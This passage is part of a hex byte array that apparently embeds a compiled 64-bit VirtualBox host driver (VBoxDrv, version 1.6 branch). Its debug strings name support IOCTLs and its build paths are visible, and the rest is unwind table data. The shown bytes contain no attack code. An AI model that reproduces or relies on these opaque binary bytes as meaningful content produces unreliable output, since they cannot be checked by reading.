    0x3C, 0x3C, 0x20, 0x31, 0x36, 0x29, 0x20, 0x7C, 0x20, 0x28, 0x28, 0x28, 0x20, 0x30, 0x78, 0x30,
    0x30, 0x30, 0x32, 0x20, 0x29, 0x29, 0x20, 0x3C, 0x3C, 0x20, 0x31, 0x34, 0x29, 0x20, 0x7C, 0x20,
    0x28, 0x28, 0x28, 0x31, 0x36, 0x29, 0x20, 0x7C, 0x20, 0x31, 0x32, 0x38, 0x29, 0x20, 0x3C, 0x3C,
    0x20, 0x32, 0x29, 0x20, 0x7C, 0x20, 0x28, 0x30, 0x29, 0x20, 0x29, 0x3A, 0x20, 0x49, 0x6E, 0x76,
    0x61, 0x6C, 0x69, 0x64, 0x20, 0x69, 0x6E, 0x70, 0x75, 0x74, 0x2F, 0x6F, 0x75, 0x74, 0x70, 0x75,
    0x74, 0x20, 0x73, 0x69, 0x7A, 0x65, 0x73, 0x2E, 0x20, 0x63, 0x62, 0x49, 0x6E, 0x3D, 0x25, 0x6C,
    0x64, 0x20, 0x65, 0x78, 0x70, 0x65, 0x63, 0x74, 0x65, 0x64, 0x20, 0x25, 0x6C, 0x64, 0x2E, 0x20,
    0x63, 0x62, 0x4F, 0x75, 0x74, 0x3D, 0x25, 0x6C, 0x64, 0x20, 0x65, 0x78, 0x70, 0x65, 0x63, 0x74,
    0x65, 0x64, 0x20, 0x25, 0x6C, 0x64, 0x2E, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x28, 0x20, 0x28, 0x28, 0x30, 0x78, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x32, 0x32, 0x29, 0x20,
    0x3C, 0x3C, 0x20, 0x31, 0x36, 0x29, 0x20, 0x7C, 0x20, 0x28, 0x28, 0x28, 0x20, 0x30, 0x78, 0x30,
    0x30, 0x30, 0x32, 0x20, 0x29, 0x29, 0x20, 0x3C, 0x3C, 0x20, 0x31, 0x34, 0x29, 0x20, 0x7C, 0x20,
    0x28, 0x28, 0x28, 0x31, 0x35, 0x29, 0x20, 0x7C, 0x20, 0x31, 0x32, 0x38, 0x29, 0x20, 0x3C, 0x3C,
    0x20, 0x32, 0x29, 0x20, 0x7C, 0x20, 0x28, 0x30, 0x29, 0x20, 0x29, 0x3A, 0x20, 0x49, 0x6E, 0x76,
    0x61, 0x6C, 0x69, 0x64, 0x20, 0x69, 0x6E, 0x70, 0x75, 0x74, 0x2F, 0x6F, 0x75, 0x74, 0x70, 0x75,
    0x74, 0x20, 0x73, 0x69, 0x7A, 0x65, 0x73, 0x2E, 0x20, 0x63, 0x62, 0x49, 0x6E, 0x3D, 0x25, 0x6C,
    0x64, 0x20, 0x65, 0x78, 0x70, 0x65, 0x63, 0x74, 0x65, 0x64, 0x20, 0x25, 0x6C, 0x64, 0x2E, 0x20,
    0x63, 0x62, 0x4F, 0x75, 0x74, 0x3D, 0x25, 0x6C, 0x64, 0x20, 0x65, 0x78, 0x70, 0x65, 0x63, 0x74,
    0x65, 0x64, 0x20, 0x25, 0x6C, 0x64, 0x2E, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x70, 0x52, 0x65, 0x71, 0x2D, 0x3E, 0x75, 0x2E, 0x49, 0x6E, 0x2E, 0x70, 0x76, 0x52, 0x33, 0x20,
    0x3E, 0x3D, 0x20, 0x50, 0x41, 0x47, 0x45, 0x5F, 0x53, 0x49, 0x5A, 0x45, 0x00, 0x00, 0x00, 0x00,
    0x53, 0x55, 0x50, 0x5F, 0x49, 0x4F, 0x43, 0x54, 0x4C, 0x5F, 0x50, 0x41, 0x47, 0x45, 0x5F, 0x4C,
    0x4F, 0x43, 0x4B, 0x3A, 0x20, 0x25, 0x73, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x70, 0x52, 0x65, 0x71, 0x2D, 0x3E, 0x75, 0x2E, 0x49, 0x6E, 0x2E, 0x63, 0x50, 0x61, 0x67, 0x65,
    0x73, 0x20, 0x3E, 0x20, 0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x53, 0x55, 0x50, 0x5F, 0x49, 0x4F, 0x43, 0x54, 0x4C, 0x5F, 0x50, 0x41, 0x47, 0x45, 0x5F, 0x4C,
    0x4F, 0x43, 0x4B, 0x3A, 0x20, 0x49, 0x6E, 0x76, 0x61, 0x6C, 0x69, 0x64, 0x20, 0x69, 0x6E, 0x70,
    0x75, 0x74, 0x2F, 0x6F, 0x75, 0x74, 0x70, 0x75, 0x74, 0x20, 0x73, 0x69, 0x7A, 0x65, 0x73, 0x2E,
    0x20, 0x63, 0x62, 0x4F, 0x75, 0x74, 0x3D, 0x25, 0x6C, 0x64, 0x20, 0x65, 0x78, 0x70, 0x65, 0x63,
    0x74, 0x65, 0x64, 0x20, 0x25, 0x6C, 0x64, 0x2E, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x53, 0x55, 0x50, 0x5F, 0x49, 0x4F, 0x43, 0x54, 0x4C, 0x5F, 0x50, 0x41, 0x47, 0x45, 0x5F, 0x4C,
    0x4F, 0x43, 0x4B, 0x3A, 0x20, 0x49, 0x6E, 0x76, 0x61, 0x6C, 0x69, 0x64, 0x20, 0x69, 0x6E, 0x70,
    0x75, 0x74, 0x2F, 0x6F, 0x75, 0x74, 0x70, 0x75, 0x74, 0x20, 0x73, 0x69, 0x7A, 0x65, 0x73, 0x2E,
    0x20, 0x63, 0x62, 0x49, 0x6E, 0x3D, 0x25, 0x6C, 0x64, 0x20, 0x65, 0x78, 0x70, 0x65, 0x63, 0x74,
    0x65, 0x64, 0x20, 0x25, 0x6C, 0x64, 0x2E, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x28, 0x20, 0x28, 0x28, 0x30, 0x78, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x32, 0x32, 0x29, 0x20,
    0x3C, 0x3C, 0x20, 0x31, 0x36, 0x29, 0x20, 0x7C, 0x20, 0x28, 0x28, 0x28, 0x20, 0x30, 0x78, 0x30,
    0x30, 0x30, 0x32, 0x20, 0x29, 0x29, 0x20, 0x3C, 0x3C, 0x20, 0x31, 0x34, 0x29, 0x20, 0x7C, 0x20,
    0x28, 0x28, 0x28, 0x34, 0x29, 0x20, 0x7C, 0x20, 0x31, 0x32, 0x38, 0x29, 0x20, 0x3C, 0x3C, 0x20,
    0x32, 0x29, 0x20, 0x7C, 0x20, 0x28, 0x30, 0x29, 0x20, 0x29, 0x3A, 0x20, 0x49, 0x6E, 0x76, 0x61,
    0x6C, 0x69, 0x64, 0x20, 0x69, 0x6E, 0x70, 0x75, 0x74, 0x2F, 0x6F, 0x75, 0x74, 0x70, 0x75, 0x74,
    0x20, 0x73, 0x69, 0x7A, 0x65, 0x73, 0x2E, 0x20, 0x63, 0x62, 0x49, 0x6E, 0x3D, 0x25, 0x6C, 0x64,
    0x20, 0x65, 0x78, 0x70, 0x65, 0x63, 0x74, 0x65, 0x64, 0x20, 0x25, 0x6C, 0x64, 0x2E, 0x20, 0x63,
    0x62, 0x4F, 0x75, 0x74, 0x3D, 0x25, 0x6C, 0x64, 0x20, 0x65, 0x78, 0x70, 0x65, 0x63, 0x74, 0x65,
    0x64, 0x20, 0x25, 0x6C, 0x64, 0x2E, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x28, 0x20, 0x28, 0x28, 0x30, 0x78, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x32, 0x32, 0x29, 0x20,
    0x3C, 0x3C, 0x20, 0x31, 0x36, 0x29, 0x20, 0x7C, 0x20, 0x28, 0x28, 0x28, 0x20, 0x30, 0x78, 0x30,
    0x30, 0x30, 0x32, 0x20, 0x29, 0x29, 0x20, 0x3C, 0x3C, 0x20, 0x31, 0x34, 0x29, 0x20, 0x7C, 0x20,
    0x28, 0x28, 0x28, 0x33, 0x29, 0x20, 0x7C, 0x20, 0x31, 0x32, 0x38, 0x29, 0x20, 0x3C, 0x3C, 0x20,
    0x32, 0x29, 0x20, 0x7C, 0x20, 0x28, 0x30, 0x29, 0x20, 0x29, 0x3A, 0x20, 0x49, 0x6E, 0x76, 0x61,
    0x6C, 0x69, 0x64, 0x20, 0x69, 0x6E, 0x70, 0x75, 0x74, 0x2F, 0x6F, 0x75, 0x74, 0x70, 0x75, 0x74,
    0x20, 0x73, 0x69, 0x7A, 0x65, 0x73, 0x2E, 0x20, 0x63, 0x62, 0x49, 0x6E, 0x3D, 0x25, 0x6C, 0x64,
    0x20, 0x65, 0x78, 0x70, 0x65, 0x63, 0x74, 0x65, 0x64, 0x20, 0x25, 0x6C, 0x64, 0x2E, 0x20, 0x63,
    0x62, 0x4F, 0x75, 0x74, 0x3D, 0x25, 0x6C, 0x64, 0x20, 0x65, 0x78, 0x70, 0x65, 0x63, 0x74, 0x65,
    0x64, 0x20, 0x25, 0x6C, 0x64, 0x2E, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x53, 0x55, 0x50, 0x5F, 0x49, 0x4F, 0x43, 0x54, 0x4C, 0x5F, 0x51, 0x55, 0x45, 0x52, 0x59, 0x5F,
    0x46, 0x55, 0x4E, 0x43, 0x53, 0x3A, 0x20, 0x49, 0x6E, 0x76, 0x61, 0x6C, 0x69, 0x64, 0x20, 0x69,
    0x6E, 0x70, 0x75, 0x74, 0x2F, 0x6F, 0x75, 0x74, 0x70, 0x75, 0x74, 0x20, 0x73, 0x69, 0x7A, 0x65,
    0x73, 0x2E, 0x20, 0x63, 0x62, 0x49, 0x6E, 0x3D, 0x25, 0x6C, 0x64, 0x20, 0x65, 0x78, 0x70, 0x65,
    0x63, 0x74, 0x65, 0x64, 0x20, 0x25, 0x6C, 0x64, 0x2E, 0x20, 0x63, 0x62, 0x4F, 0x75, 0x74, 0x3D,
    0x25, 0x6C, 0x64, 0x20, 0x65, 0x78, 0x70, 0x65, 0x63, 0x74, 0x65, 0x64, 0x20, 0x25, 0x6C, 0x64,
    0x2E, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x28, 0x20, 0x28, 0x28, 0x30, 0x78, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x32, 0x32, 0x29, 0x20,
    0x3C, 0x3C, 0x20, 0x31, 0x36, 0x29, 0x20, 0x7C, 0x20, 0x28, 0x28, 0x28, 0x20, 0x30, 0x78, 0x30,
    0x30, 0x30, 0x32, 0x20, 0x29, 0x29, 0x20, 0x3C, 0x3C, 0x20, 0x31, 0x34, 0x29, 0x20, 0x7C, 0x20,
    0x28, 0x28, 0x28, 0x31, 0x29, 0x20, 0x7C, 0x20, 0x31, 0x32, 0x38, 0x29, 0x20, 0x3C, 0x3C, 0x20,
    0x32, 0x29, 0x20, 0x7C, 0x20, 0x28, 0x30, 0x29, 0x20, 0x29, 0x3A, 0x20, 0x49, 0x6E, 0x76, 0x61,
    0x6C, 0x69, 0x64, 0x20, 0x69, 0x6E, 0x70, 0x75, 0x74, 0x2F, 0x6F, 0x75, 0x74, 0x70, 0x75, 0x74,
    0x20, 0x73, 0x69, 0x7A, 0x65, 0x73, 0x2E, 0x20, 0x63, 0x62, 0x49, 0x6E, 0x3D, 0x25, 0x6C, 0x64,
    0x20, 0x65, 0x78, 0x70, 0x65, 0x63, 0x74, 0x65, 0x64, 0x20, 0x25, 0x6C, 0x64, 0x2E, 0x20, 0x63,
    0x62, 0x4F, 0x75, 0x74, 0x3D, 0x25, 0x6C, 0x64, 0x20, 0x65, 0x78, 0x70, 0x65, 0x63, 0x74, 0x65,
    0x64, 0x20, 0x25, 0x6C, 0x64, 0x2E, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x53, 0x55, 0x50, 0x5F, 0x49, 0x4F, 0x43, 0x54, 0x4C, 0x5F, 0x43, 0x4F, 0x4F, 0x4B, 0x49, 0x45,
    0x3A, 0x20, 0x56, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 0x20, 0x6D, 0x69, 0x73, 0x6D, 0x61, 0x74,
    0x63, 0x68, 0x2E, 0x20, 0x52, 0x65, 0x71, 0x75, 0x65, 0x73, 0x74, 0x65, 0x64, 0x3A, 0x20, 0x25,
    0x23, 0x78, 0x20, 0x20, 0x4D, 0x69, 0x6E, 0x3A, 0x20, 0x25, 0x23, 0x78, 0x20, 0x20, 0x43, 0x75,
    0x72, 0x72, 0x65, 0x6E, 0x74, 0x3A, 0x20, 0x25, 0x23, 0x78, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x53, 0x55, 0x50, 0x5F, 0x49, 0x4F, 0x43, 0x54, 0x4C, 0x5F, 0x43, 0x4F, 0x4F, 0x4B, 0x49, 0x45,
    0x3A, 0x20, 0x69, 0x6E, 0x76, 0x61, 0x6C, 0x69, 0x64, 0x20, 0x6D, 0x61, 0x67, 0x69, 0x63, 0x20,
    0x25, 0x2E, 0x31, 0x36, 0x73, 0x0A, 0x00, 0x00, 0x54, 0x68, 0x65, 0x20, 0x4D, 0x61, 0x67, 0x69,
    0x63, 0x20, 0x57, 0x6F, 0x72, 0x64, 0x21, 0x00, 0x53, 0x55, 0x50, 0x5F, 0x49, 0x4F, 0x43, 0x54,
    0x4C, 0x5F, 0x43, 0x4F, 0x4F, 0x4B, 0x49, 0x45, 0x3A, 0x20, 0x62, 0x61, 0x64, 0x20, 0x63, 0x6F,
    0x6F, 0x6B, 0x69, 0x65, 0x20, 0x25, 0x23, 0x6C, 0x78, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x70, 0x50, 0x61, 0x72, 0x65, 0x6E, 0x74, 0x2D, 0x3E, 0x65, 0x6E, 0x6D, 0x54, 0x79, 0x70, 0x65,
    0x20, 0x3E, 0x20, 0x52, 0x54, 0x52, 0x30, 0x4D, 0x45, 0x4D, 0x4F, 0x42, 0x4A, 0x54, 0x59, 0x50,
    0x45, 0x5F, 0x49, 0x4E, 0x56, 0x41, 0x4C, 0x49, 0x44, 0x20, 0x26, 0x26, 0x20, 0x70, 0x50, 0x61,
    0x72, 0x65, 0x6E, 0x74, 0x2D, 0x3E, 0x65, 0x6E, 0x6D, 0x54, 0x79, 0x70, 0x65, 0x20, 0x3C, 0x20,
    0x52, 0x54, 0x52, 0x30, 0x4D, 0x45, 0x4D, 0x4F, 0x42, 0x4A, 0x54, 0x59, 0x50, 0x45, 0x5F, 0x45,
    0x4E, 0x44, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x70, 0x50, 0x61, 0x72, 0x65, 0x6E, 0x74, 0x2D,
    0x3E, 0x75, 0x52, 0x65, 0x6C, 0x2E, 0x50, 0x61, 0x72, 0x65, 0x6E, 0x74, 0x2E, 0x63, 0x4D, 0x61,
    0x70, 0x70, 0x69, 0x6E, 0x67, 0x73, 0x20, 0x3E, 0x20, 0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x21, 0x72, 0x74, 0x52, 0x30, 0x4D, 0x65, 0x6D, 0x4F, 0x62, 0x6A, 0x49, 0x73, 0x4D, 0x61, 0x70,
    0x70, 0x69, 0x6E, 0x67, 0x28, 0x70, 0x50, 0x61, 0x72, 0x65, 0x6E, 0x74, 0x29, 0x00, 0x00, 0x00,
    0x70, 0x43, 0x68, 0x69, 0x6C, 0x64, 0x2D, 0x3E, 0x75, 0x33, 0x32, 0x4D, 0x61, 0x67, 0x69, 0x63,
    0x20, 0x3D, 0x3D, 0x20, 0x52, 0x54, 0x52, 0x30, 0x4D, 0x45, 0x4D, 0x4F, 0x42, 0x4A, 0x5F, 0x4D,
    0x41, 0x47, 0x49, 0x43, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x70, 0x43, 0x68, 0x69, 0x6C, 0x64, 0x2D, 0x3E, 0x65, 0x6E, 0x6D, 0x54, 0x79, 0x70, 0x65, 0x20,
    0x3E, 0x20, 0x52, 0x54, 0x52, 0x30, 0x4D, 0x45, 0x4D, 0x4F, 0x42, 0x4A, 0x54, 0x59, 0x50, 0x45,
    0x5F, 0x49, 0x4E, 0x56, 0x41, 0x4C, 0x49, 0x44, 0x20, 0x26, 0x26, 0x20, 0x70, 0x43, 0x68, 0x69,
    0x6C, 0x64, 0x2D, 0x3E, 0x65, 0x6E, 0x6D, 0x54, 0x79, 0x70, 0x65, 0x20, 0x3C, 0x20, 0x52, 0x54,
    0x52, 0x30, 0x4D, 0x45, 0x4D, 0x4F, 0x42, 0x4A, 0x54, 0x59, 0x50, 0x45, 0x5F, 0x45, 0x4E, 0x44,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x72, 0x74, 0x52, 0x30, 0x4D, 0x65, 0x6D, 0x4F,
    0x62, 0x6A, 0x49, 0x73, 0x4D, 0x61, 0x70, 0x70, 0x69, 0x6E, 0x67, 0x28, 0x70, 0x43, 0x68, 0x69,
    0x6C, 0x64, 0x29, 0x00, 0x00, 0x00, 0x00, 0x00, 0x70, 0x50, 0x61, 0x72, 0x65, 0x6E, 0x74, 0x2D,
    0x3E, 0x75, 0x33, 0x32, 0x4D, 0x61, 0x67, 0x69, 0x63, 0x20, 0x3D, 0x3D, 0x20, 0x52, 0x54, 0x52,
    0x30, 0x4D, 0x45, 0x4D, 0x4F, 0x42, 0x4A, 0x5F, 0x4D, 0x41, 0x47, 0x49, 0x43, 0x00, 0x00, 0x00,
    0x43, 0x3A, 0x5C, 0x76, 0x62, 0x6F, 0x78, 0x5C, 0x62, 0x72, 0x61, 0x6E, 0x63, 0x68, 0x5C, 0x77,
    0x36, 0x34, 0x2D, 0x31, 0x2E, 0x36, 0x5C, 0x73, 0x72, 0x63, 0x5C, 0x56, 0x42, 0x6F, 0x78, 0x5C,
    0x52, 0x75, 0x6E, 0x74, 0x69, 0x6D, 0x65, 0x5C, 0x72, 0x30, 0x64, 0x72, 0x76, 0x5C, 0x6D, 0x65,
    0x6D, 0x6F, 0x62, 0x6A, 0x2D, 0x72, 0x30, 0x64, 0x72, 0x76, 0x2E, 0x63, 0x70, 0x70, 0x00, 0x00,
    0x52, 0x54, 0x52, 0x30, 0x4D, 0x65, 0x6D, 0x4F, 0x62, 0x6A, 0x46, 0x72, 0x65, 0x65, 0x00, 0x00,
    0x52, 0x53, 0x44, 0x53, 0xC5, 0xCA, 0x7D, 0x0A, 0xEB, 0xB5, 0x1C, 0x4B, 0x9C, 0x3A, 0xAD, 0x52,
    0x77, 0x54, 0xBE, 0x0D, 0x01, 0x00, 0x00, 0x00, 0x43, 0x3A, 0x5C, 0x76, 0x62, 0x6F, 0x78, 0x5C,
    0x62, 0x72, 0x61, 0x6E, 0x63, 0x68, 0x5C, 0x77, 0x36, 0x34, 0x2D, 0x31, 0x2E, 0x36, 0x5C, 0x6F,
    0x75, 0x74, 0x5C, 0x77, 0x69, 0x6E, 0x2E, 0x61, 0x6D, 0x64, 0x36, 0x34, 0x5C, 0x72, 0x65, 0x6C,
    0x65, 0x61, 0x73, 0x65, 0x5C, 0x6F, 0x62, 0x6A, 0x5C, 0x73, 0x72, 0x63, 0x5C, 0x56, 0x42, 0x6F,
    0x78, 0x5C, 0x48, 0x6F, 0x73, 0x74, 0x44, 0x72, 0x69, 0x76, 0x65, 0x72, 0x73, 0x5C, 0x56, 0x42,
    0x6F, 0x78, 0x44, 0x72, 0x76, 0x5C, 0x56, 0x42, 0x6F, 0x78, 0x44, 0x72, 0x76, 0x2E, 0x70, 0x64,
    0x62, 0x00, 0x00, 0x00, 0x01, 0x06, 0x02, 0x00, 0x06, 0x12, 0x02, 0x30, 0x01, 0x0A, 0x04, 0x00,
    0x0A, 0x34, 0x06, 0x00, 0x0A, 0x32, 0x06, 0x70, 0x01, 0x18, 0x0A, 0x00, 0x18, 0x64, 0x0A, 0x00,
    0x18, 0x54, 0x09, 0x00, 0x18, 0x34, 0x08, 0x00, 0x18, 0x32, 0x14, 0xD0, 0x12, 0xC0, 0x10, 0x70,
    0x01, 0x04, 0x01, 0x00, 0x04, 0x42, 0x00, 0x00, 0x01, 0x0A, 0x04, 0x00, 0x0A, 0x34, 0x08, 0x00,
    0x0A, 0x52, 0x06, 0x70, 0x21, 0x00, 0x00, 0x00, 0xB0, 0x05, 0x00, 0x00, 0xEC, 0x05, 0x00, 0x00,
    0x44, 0xA0, 0x00, 0x00, 0x21, 0x1B, 0x08, 0x00, 0x1B, 0xD4, 0x04, 0x00, 0x0F, 0xC4, 0x0A, 0x00,
    0x0A, 0x64, 0x09, 0x00, 0x05, 0x34, 0x08, 0x00, 0xB0, 0x05, 0x00, 0x00, 0xEC, 0x05, 0x00, 0x00,
    0x44, 0xA0, 0x00, 0x00, 0x01, 0x07, 0x03, 0x00, 0x07, 0x42, 0x03, 0x70, 0x02, 0x50, 0x00, 0x00,
    0x01, 0x06, 0x02, 0x00, 0x06, 0x52, 0x02, 0x30, 0x09, 0x06, 0x02, 0x00, 0x06, 0x72, 0x02, 0x30,
    0x38, 0x50, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0xE9, 0x06, 0x00, 0x00, 0x18, 0x07, 0x00, 0x00,
    0x01, 0x00, 0x00, 0x00, 0x18, 0x07, 0x00, 0x00, 0x09, 0x06, 0x02, 0x00, 0x06, 0x52, 0x02, 0x30,
    0x38, 0x50, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x2B, 0x07, 0x00, 0x00, 0x3D, 0x07, 0x00, 0x00,
    0x01, 0x00, 0x00, 0x00, 0x3D, 0x07, 0x00, 0x00, 0x01, 0x04, 0x01, 0x00, 0x04, 0x42, 0x00, 0x00,
    0x01, 0x04, 0x01, 0x00, 0x04, 0x62, 0x00, 0x00, 0x01, 0x0F, 0x06, 0x00, 0x0F, 0x64, 0x0B, 0x00,
    0x0F, 0x34, 0x0A, 0x00, 0x0F, 0x72, 0x0B, 0x70, 0x01, 0x56, 0x06, 0x00, 0x56, 0x34, 0x07, 0x00,
    0x0A, 0x54, 0x08, 0x00, 0x0A, 0x32, 0x06, 0x70, 0x09, 0x0F, 0x04, 0x00, 0x0F, 0x34, 0x06, 0x00,
    0x0F, 0x32, 0x0B, 0x70, 0x38, 0x50, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x6A, 0x0B, 0x00, 0x00,
    0x72, 0x0B, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x72, 0x0B, 0x00, 0x00, 0x01, 0x14, 0x08, 0x00,
    0x14, 0x64, 0x0B, 0x00, 0x14, 0x54, 0x0A, 0x00, 0x14, 0x34, 0x08, 0x00, 0x14, 0x52, 0x10, 0x70,
    0x01, 0x0F, 0x06, 0x00, 0x0F, 0x64, 0x0F, 0x00, 0x0F, 0x34, 0x0E, 0x00, 0x0F, 0xB2, 0x0B, 0x70,
    0x01, 0x05, 0x02, 0x00, 0x05, 0x34, 0x01, 0x00, 0x01, 0x06, 0x02, 0x00, 0x06, 0x12, 0x02, 0x30,
    0x01, 0x06, 0x02, 0x00, 0x06, 0x12, 0x02, 0x30, 0x01, 0x06, 0x02, 0x00, 0x06, 0x32, 0x02, 0x30,
    0x01, 0x0F, 0x06, 0x00, 0x0F, 0x64, 0x07, 0x00, 0x0F, 0x34, 0x06, 0x00, 0x0F, 0x32, 0x0B, 0x70,
    0x01, 0x0F, 0x06, 0x00, 0x0F, 0x64, 0x07, 0x00, 0x0F, 0x34, 0x06, 0x00, 0x0F, 0x32, 0x0B, 0x70,
    0x01, 0x14, 0x08, 0x00, 0x14, 0x64, 0x08, 0x00, 0x14, 0x54, 0x07, 0x00, 0x14, 0x34, 0x06, 0x00,
    0x14, 0x32, 0x10, 0x70, 0x21, 0x00, 0x00, 0x00, 0xA0, 0x12, 0x00, 0x00, 0x46, 0x13, 0x00, 0x00,
    0xAC, 0xA1, 0x00, 0x00, 0x21, 0x00, 0x02, 0x00, 0x00, 0x34, 0x0A, 0x00, 0xA0, 0x12, 0x00, 0x00,
    0x46, 0x13, 0x00, 0x00, 0xAC, 0xA1, 0x00, 0x00, 0x21, 0x00, 0x00, 0x00, 0xA0, 0x12, 0x00, 0x00,
    0x46, 0x13, 0x00, 0x00, 0xAC, 0xA1, 0x00, 0x00, 0x21, 0x05, 0x02, 0x00, 0x05, 0x34, 0x0A, 0x00,
    0xA0, 0x12, 0x00, 0x00, 0x46, 0x13, 0x00, 0x00, 0xAC, 0xA1, 0x00, 0x00, 0x01, 0x13, 0x08, 0x00,
    0x13, 0x64, 0x0C, 0x00, 0x13, 0x54, 0x0B, 0x00, 0x13, 0x52, 0x0F, 0xD0, 0x0D, 0xC0, 0x0B, 0x70,
    0x21, 0x00, 0x00, 0x00, 0x60, 0x14, 0x00, 0x00, 0xFF, 0x14, 0x00, 0x00, 0xF8, 0xA1, 0x00, 0x00,
    0x21, 0x00, 0x02, 0x00, 0x00, 0x34, 0x08, 0x00, 0x60, 0x14, 0x00, 0x00, 0xFF, 0x14, 0x00, 0x00,
    0xF8, 0xA1, 0x00, 0x00, 0x21, 0x05, 0x02, 0x00, 0x05, 0x34, 0x08, 0x00, 0x60, 0x14, 0x00, 0x00,
    0xFF, 0x14, 0x00, 0x00, 0xF8, 0xA1, 0x00, 0x00, 0x01, 0x0F, 0x06, 0x00, 0x0F, 0x64, 0x0A, 0x00,
    0x0F, 0x54, 0x09, 0x00, 0x0F, 0x52, 0x0B, 0x70, 0x21, 0x00, 0x00, 0x00, 0xE0, 0x15, 0x00, 0x00,
    0x86, 0x16, 0x00, 0x00, 0x2C, 0xA2, 0x00, 0x00, 0x21, 0x05, 0x02, 0x00, 0x05, 0x34, 0x0A, 0x00,
    0xE0, 0x15, 0x00, 0x00, 0x86, 0x16, 0x00, 0x00, 0x2C, 0xA2, 0x00, 0x00, 0x01, 0x13, 0x08, 0x00,
    0x13, 0x64, 0x0C, 0x00, 0x13, 0x54, 0x0B, 0x00, 0x13, 0x52, 0x0F, 0xD0, 0x0D, 0xC0, 0x0B, 0x70,
    0x01, 0x0A, 0x04, 0x00, 0x0A, 0x34, 0x07, 0x00, 0x0A, 0x32, 0x06, 0x70, 0x21, 0x00, 0x00, 0x00,
    0x70, 0x18, 0x00, 0x00, 0x07, 0x19, 0x00, 0x00, 0x9C, 0xA2, 0x00, 0x00, 0x21, 0x00, 0x08, 0x00,
    0x00, 0x74, 0x06, 0x00, 0x00, 0x64, 0x0E, 0x00, 0x00, 0x54, 0x0D, 0x00, 0x00, 0x34, 0x0C, 0x00,
    0x70, 0x18, 0x00, 0x00, 0x07, 0x19, 0x00, 0x00, 0x9C, 0xA2, 0x00, 0x00, 0x21, 0x19, 0x08, 0x00,
    0x19, 0x74, 0x06, 0x00, 0x14, 0x64, 0x0E, 0x00, 0x0A, 0x54, 0x0D, 0x00, 0x05, 0x34, 0x0C, 0x00,
    0x70, 0x18, 0x00, 0x00, 0x07, 0x19, 0x00, 0x00, 0x9C, 0xA2, 0x00, 0x00, 0x01, 0x0C, 0x05, 0x00,
    0x0C, 0x62, 0x08, 0xF0, 0x06, 0xE0, 0x04, 0xD0, 0x02, 0xC0, 0x00, 0x00, 0x01, 0x19, 0x0A, 0x00,
    0x19, 0x74, 0x0B, 0x00, 0x19, 0x64, 0x0A, 0x00, 0x19, 0x54, 0x09, 0x00, 0x19, 0x34, 0x08, 0x00,
    0x19, 0x52, 0x15, 0xC0, 0x01, 0x20, 0x0C, 0x00, 0x20, 0x64, 0x0F, 0x00, 0x20, 0x54, 0x0D, 0x00,
    0x20, 0x34, 0x0C, 0x00, 0x20, 0x52, 0x1C, 0xF0, 0x1A, 0xE0, 0x18, 0xD0, 0x16, 0xC0, 0x14, 0x70,
    0x01, 0x1C, 0x0C, 0x00, 0x1C, 0x64, 0x0C, 0x00, 0x1C, 0x54, 0x0B, 0x00, 0x1C, 0x34, 0x0A, 0x00,
    0x1C, 0x32, 0x18, 0xF0, 0x16, 0xE0, 0x14, 0xD0, 0x12, 0xC0, 0x10, 0x70, 0x01, 0x0F, 0x06, 0x00,
    0x0F, 0x64, 0x07, 0x00, 0x0F, 0x34, 0x06, 0x00, 0x0F, 0x32, 0x0B, 0x70, 0x21, 0x00, 0x02, 0x00,
    0x00, 0x34, 0x08, 0x00, 0xB0, 0x1E, 0x00, 0x00, 0x25, 0x1F, 0x00, 0x00, 0x44, 0xA3, 0x00, 0x00,
    0x21, 0x00, 0x00, 0x00, 0xB0, 0x1E, 0x00, 0x00, 0x25, 0x1F, 0x00, 0x00, 0x44, 0xA3, 0x00, 0x00,
    0x21, 0x05, 0x02, 0x00, 0x05, 0x34, 0x08, 0x00, 0xB0, 0x1E, 0x00, 0x00, 0x25, 0x1F, 0x00, 0x00,
    0x44, 0xA3, 0x00, 0x00, 0x01, 0x0F, 0x06, 0x00, 0x0F, 0x64, 0x0A, 0x00, 0x0F, 0x54, 0x09, 0x00,
    0x0F, 0x52, 0x0B, 0x70, 0x21, 0x00, 0x06, 0x00, 0x00, 0x74, 0x10, 0x00, 0x00, 0x64, 0x0F, 0x00,
    0x00, 0x34, 0x0E, 0x00, 0x00, 0x20, 0x00, 0x00, 0x40, 0x20, 0x00, 0x00, 0x8C, 0xA3, 0x00, 0x00,
    0x21, 0x17, 0x06, 0x00, 0x17, 0x74, 0x10, 0x00, 0x0F, 0x64, 0x0F, 0x00, 0x05, 0x34, 0x0E, 0x00,
